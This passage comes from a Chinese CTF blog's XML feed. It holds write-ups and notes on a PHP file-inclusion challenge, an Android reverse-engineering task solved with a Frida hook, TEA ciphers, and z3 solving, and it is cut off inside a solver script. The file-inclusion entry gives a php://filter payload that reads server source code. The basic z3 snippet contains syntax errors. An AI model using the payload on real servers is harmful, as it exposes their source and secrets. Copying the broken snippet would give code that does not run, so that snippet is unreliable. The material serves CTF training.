        <content type="html"><![CDATA[<h2 id="buuctf-ACTF2020-新生赛-Include"><a href="#buuctf-ACTF2020-新生赛-Include" class="headerlink" title="buuctf[ACTF2020 新生赛]Include"></a>buuctf[ACTF2020 新生赛]Include</h2><p>打开靶机看到页面只有一个tips</p><p><img src="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/1.png" alt="1"></p><p>点击一下</p><p><img src="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/2.png" alt="2"></p><p>看源码什么也没有，结合题目include猜测是文件包含</p><p>来个链接学一下 <a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p><p>我们可以用php伪协议，再来个链接 <a href="https://blog.csdn.net/cosmoslin/article/details/120695429">https://blog.csdn.net/cosmoslin/article/details/120695429</a></p><p>我们可以用php:&#x2F;&#x2F;filiter读取源码</p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/3.png" alt="3"></p><p>base64解密以下得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">好久没学新东西了，突然发现web的入门题还是很好玩的。脑子有点混乱了，还有很多东西要学啊，没关系，</span><br><span class="line">今天又进步了一点😊</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 签到 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2025</title>
      <link href="/2025/02/19/hgame2025/"/>
      <url>/2025/02/19/hgame2025/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3c1164c5bbf0bee5da36f588dbe81ea65f7a1c1d1456497bb0449c7d1d9fc39c">62e1f3225d430feeb56f91434d2e165c6a6a4cca9b0fe96b9e668ac09f30dac84a09926897b767a3cdc49b3327c4e4e9d7cf0e97628d05720464340ea5e8e27b8e11d5edb9641d8cc6370a83a4236751e4fd5c3b3469f82f18b364748de83256262786d898fd6a7240d3581f96f61f72e4d165ede7941960a678f6e93dc29218e7962bbed27ffcd9419d68c6023565daa9fb427ad1e685ec503ce7d5b7cb36b231fffdc7a3ab992b36c4369eb97ed3c072ff07210691d83edb5da54c07e6978b93c25665f707f9ebf833c429cd27b17ac48ecd6765a533fde670fc4e373ce8dd0247542c5bcc213a0638f3ab0923a3bad221f5ebeb5f7568c374d00f9ab337c9241b6b262156e52c433019e2e7d50dfeedc88edd7e424b1dc018698a15960f805313d465b62e08fbdc9af8179c7274e1d296df18107e44714df6085ef449854c1393f566796172e7318b213c731fbc964dbf501c4efa49cae0450cae463f30b0308f4a0059db4a3eec07dff47250c743685c495b53c4909a96c9683c9b6abdd375bab71c314feb1e749064edcc5e12441cbfa6b80539071f8ce3484415283ab81b42af35c95dafd25edc993a4a250513d23e4cc5f94b651f569ad0ffae6c8043657ef0e5393e729f17c40398f26eaf75ef7480a6f500fd980f36289c04ff3aa0f56b9fdbcd0a14bbf660b1fdfe8e050f3d691b934a01997d92c5ebd419781d0d49ca916b0ddac10bdb8f72de82abb02f5dffac1a075351facb8f4792b4e25238025ee7c0c49f76ad1be80f5bf345f1532c84bc7226fedf6944d353e972ed3899dba5f1f41d680072a49ece91fcea1d4af85f53fb7c67462f7149fab93c8753ed5dc76eb635a8f069b30562b9881f918f965c70d17636feb81adc96294e7576181d99efc1fd892443069eb029407b1176e3ab2da1f6129c38280adcbe33cdaec1e41a5f04030f29e309fc7e1ebb8a75f95f3fda79589565baeb649ea98bce677f326c8db58f13d5fd0023a6c6386f8876878132990205a4876a574121ba33b5ebb8096a7d9cff95f8f22f36d96599f17d363291d2841a1bfc2c5de6b88953f2b13d2915ac1bb43ea450a1edaeb8782efc740d759aff2c57c3fc5df3130e597f8f447e1727b83c98e9e702758ff59bf1a73fc508855b5bb221e1ee9d381867760bfd0e2bb22395002e64f17c696120121b94aadde1c401bd2220295799afbf0b0a3d754a625878887faf0b0a67b9fb7c82fadd7c752b119962cd6db747c9e21a3bb1db7492861e6ba3683a8c0c09595ab4a449025b8c67002681f8451217cc4dfe99e69bd364e5d53112cf69485c7c7f8f39e8c1e18545ea5c985e54611c9ed7ddad1b42c1ec3b68c66ae0d13d64cdd300b9173a1ee129137c53e4ac66d724c7a0bb63cffc96dfb4efa711fddc623fa63f81b6de0a7cf3b1a143cd2d18e354c3fbe99370f9920e27d8995284829458b7b406e6c4081789bfe5e70c03992885c356396b23974ef0eb84bb7ef00a12dde8a0becf1c537822a9dd193a492aa321ffc3cfc98fcd12012dd000473f5de02bab5782c182abfd4a08475f9c735f173a79f4dcfc8d7dddfbc90adcc944cdfaf7166c60fb8e73ee54e5bdca6c124a1b082583</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-re</title>
      <link href="/2025/02/16/VNCTF-re/"/>
      <url>/2025/02/16/VNCTF-re/</url>
      
        <content type="html"><![CDATA[<p>😫今天终于想起来复现了，这次比赛没做出来一道题，好惨</p><h2 id="hook-fish"><a href="#hook-fish" class="headerlink" title="hook_fish"></a>hook_fish</h2><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p><img src="/2025/02/16/VNCTF-re/1.png" alt="timu"></p><p>总之就是输入flag验证是否正确</p><p>先找到主函数</p><p><img src="/2025/02/16/VNCTF-re/2.png" alt="main"></p><p>check验证函数应该在hook_fish.dex中，根据fish函数的参数hookfish找到下载链接</p><p><img src="/2025/02/16/VNCTF-re/3.png" alt="down"></p><p>输入的flag先经过本地encrypt函数加密，再经过hook_fish.dex中的check方法进行混淆</p><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p><img src="/2025/02/16/VNCTF-re/4.png" alt="jiemi"></p><p>check方法用哈希映射加密，在mainactivity中保留了decode方法，可以用hook方法解密</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = </span><br><span class="line">   <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.hihitt.MainActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;找到类: com.example.hihitt.MainActivity&quot;</span>);</span><br><span class="line">    <span class="comment">//hook 掉删除的方法，并直接在此方法中进行解密</span></span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">fish_fade</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;阻止删除了文件&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> result = </span><br><span class="line">   <span class="variable language_">this</span>.<span class="title function_">decode</span>(<span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;解密结果: &quot;</span> + result);</span><br><span class="line">    &#125;;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure><p>得到解密结果: 0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5</p><p>然后逆向解密</p><p><img src="/2025/02/16/VNCTF-re/5.png" alt="jiemi"></p><p>code函数的作用就是每两个字节之间交换顺序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">char</span> encode[<span class="number">73</span>] = </span><br><span class="line"><span class="string">&quot;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5&quot;</span>;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="number">72</span>;i++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(encode[i] &gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; encode[i]&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line"> encode[i]= (encode[i]-(i%<span class="number">4</span>))+<span class="number">49</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> encode[i]= (encode[i]-(i%<span class="number">10</span>))- <span class="number">55</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">72</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line"> <span class="type">char</span> tmp = encode[i];</span><br><span class="line"> encode[i]=encode[i+<span class="number">1</span>];</span><br><span class="line"> encode[i+<span class="number">1</span>]=tmp;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">72</span>;i++)&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,encode[i]);</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//结果为9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/16/VNCTF-re/6.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TEA</title>
      <link href="/2025/02/10/TEA/"/>
      <url>/2025/02/10/TEA/</url>
      
        <content type="html"><![CDATA[<h2 id="TEA原理"><a href="#TEA原理" class="headerlink" title="TEA原理"></a>TEA原理</h2><p>TEA是一种分组加密算法，使用64位的密文分组和128位的密钥，它使用Feistel分组加密框架，需要进行 <strong>64</strong> 轮迭代，尽管作者认为 <strong>32</strong> 轮已经足够了。该算法使用delta作为倍数，以保证每一轮加密都不相同，TEA中定义为0x9e3779b9</p><p><img src="/2025/02/10/TEA/1.png" alt="tea"></p><p>加密函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="comment">//总共加密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    sum = delta &lt;&lt; <span class="number">5</span>;   <span class="comment">//注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.</span></span><br><span class="line">    <span class="comment">//总共加密32轮 那么反序也解密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 先将y解开 然后参与运算在解x</span></span><br><span class="line">        y -= ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        x -= ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TEA逆向"><a href="#TEA逆向" class="headerlink" title="TEA逆向"></a>TEA逆向</h2><p>tea的特征为delta和16字节的密钥，有些魔改的tea会改变delta的值</p><h2 id="XTEA原理"><a href="#XTEA原理" class="headerlink" title="XTEA原理"></a>XTEA原理</h2><p>TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本——XTEA（有时也被称为”tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合，但速度更慢了。</p><h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的z3</title>
      <link href="/2025/02/10/%E7%AE%80%E5%8D%95%E7%9A%84z3/"/>
      <url>/2025/02/10/%E7%AE%80%E5%8D%95%E7%9A%84z3/</url>
      
        <content type="html"><![CDATA[<h2 id="z3-solver求解器"><a href="#z3-solver求解器" class="headerlink" title="z3-solver求解器"></a>z3-solver求解器</h2><p>z3-solver是由Microsoft Research(微软)开发的SMT求解器，它用于检查逻辑表达式的可满足性，可以找到一组约束中的其中一个可行解，缺点是无法找出所有的可行解</p><p>pip安装：<code>pip install z3-solver</code></p><p>基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line">x.Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y.Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">s=z3.Solver()</span><br><span class="line">s.add(x+y=<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;NO SOLUTION!&quot;</span>)</span><br></pre></td></tr></table></figure><p>实数：<code>y = z3.Real(name = &#39;y&#39;)</code></p><p>位向量：<code>z = z3.BitVec(name = &#39;z&#39;, bv = 32)</code></p><p>布尔：<code>p = z3.Bool(name = &#39;p&#39;)</code></p><p>对于布尔类型的式子而言，我们可以使用 <code>z3</code> 内置的 <code>And()</code>、<code>Or()</code>、<code>Not()</code>、<code>Implies()</code> 等方法进行布尔逻辑运算</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[NSSRound#X Basic]ez_z3</p><p>第一步查壳，是64位，UPX的魔改壳，把XYU改成UPX后直接脱壳</p><p>第二步放入ida找到关键代码</p><p><img src="/2025/02/10/%E7%AE%80%E5%8D%95%E7%9A%84z3/1.png" alt="daima"></p><p>sub_14001124E函数是快速幂的变体，</p><p>sub_14001103C里面一堆方程，用z3求解，但是ida代码中方程直接的逻辑关系是||，但是只有全部满足才能做出来，有点奇怪</p><p>sub_1400112F8是异或，最后判断是否相等</p><p>exp:</p><p>求z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s=Solver()</span><br><span class="line">a0,a1,a2,a3,a4,a5,a6,a7,a8,a9 = BitVecs(<span class="string">&quot;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&quot;</span>,<span class="number">12</span>)</span><br><span class="line">a10,a11,a12,a13,a14,a15,a16,a17,a18,a19 = BitVecs(<span class="string">&quot;a10 a11 a12 a13 a14 a15 a16 a17 a18 a19&quot;</span>,<span class="number">12</span>)</span><br><span class="line">s.add(<span class="number">2582239</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> - a2*<span class="number">3</span> - a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> * a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2602741</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> + a2*<span class="number">3</span> - a3*<span class="number">4</span> + a4*<span class="number">5</span> + (a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span>) + a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - (a16*<span class="number">17</span> + a17*<span class="number">18</span>) + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2668123</span> == a0*<span class="number">1</span> - a1*<span class="number">2</span> - a2*<span class="number">3</span> * a3*<span class="number">4</span> - a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> + a8*<span class="number">9</span> - a9*<span class="number">10</span></span><br><span class="line">+ a10*<span class="number">11</span> * a11*<span class="number">12</span> + a12*<span class="number">13</span> * a13*<span class="number">14</span> - a14*<span class="number">15</span> - a15*<span class="number">16</span> * a16*<span class="number">17</span> + a17*<span class="number">18</span> + a18*<span class="number">19</span> -</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2520193</span> == (a0*<span class="number">1</span> + a1*<span class="number">2</span> - a2*<span class="number">3</span> - a3*<span class="number">4</span> + a4*<span class="number">5</span>) + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">* (a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span>) + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">8904587</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> * a2*<span class="number">3</span> - a3*<span class="number">4</span> - a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> * a8*<span class="number">9</span> + a9*<span class="number">10</span> -</span><br><span class="line">a10*<span class="number">11</span> + a11*<span class="number">12</span> * a12*<span class="number">13</span> - a13*<span class="number">14</span> + a14*<span class="number">15</span> - a15*<span class="number">16</span> + a16*<span class="number">17</span> + a17*<span class="number">18</span> - a18*<span class="number">19</span> - a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">1227620874</span> == a0*<span class="number">1</span> - a1*<span class="number">2</span> - a2*<span class="number">3</span> + (a3*<span class="number">4</span> + a4*<span class="number">5</span> * a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span>) - a8*<span class="number">9</span> -</span><br><span class="line">a9*<span class="number">10</span> * a10*<span class="number">11</span> - (a11*<span class="number">12</span> + a12*<span class="number">13</span> - a13*<span class="number">14</span> - a14*<span class="number">15</span>) * a15*<span class="number">16</span> - a16*<span class="number">17</span> + a17*<span class="number">18</span> - a18*<span class="number">19</span></span><br><span class="line">- a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">1836606059</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> + a2*<span class="number">3</span> + a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> +</span><br><span class="line">a9*<span class="number">10</span> * a10*<span class="number">11</span> * a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> + a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span></span><br><span class="line">* a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">8720560</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> - a2*<span class="number">3</span> + a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> - a9*<span class="number">10</span></span><br><span class="line">- a10*<span class="number">11</span> + a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> + a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">11387045</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> - a2*<span class="number">3</span> + (a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> +</span><br><span class="line">a9*<span class="number">10</span>) * a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * (a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span>) + a18*<span class="number">19</span></span><br><span class="line">* a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">7660269</span> == a0*<span class="number">1</span> - a1*<span class="number">2</span> + a2*<span class="number">3</span> + a3*<span class="number">4</span> - a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> + a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span> - a12*<span class="number">13</span> + a13*<span class="number">14</span> + a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> * a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2461883</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> - (a2*<span class="number">3</span> * a3*<span class="number">4</span> - a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span>) - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + (a9*<span class="number">10</span></span><br><span 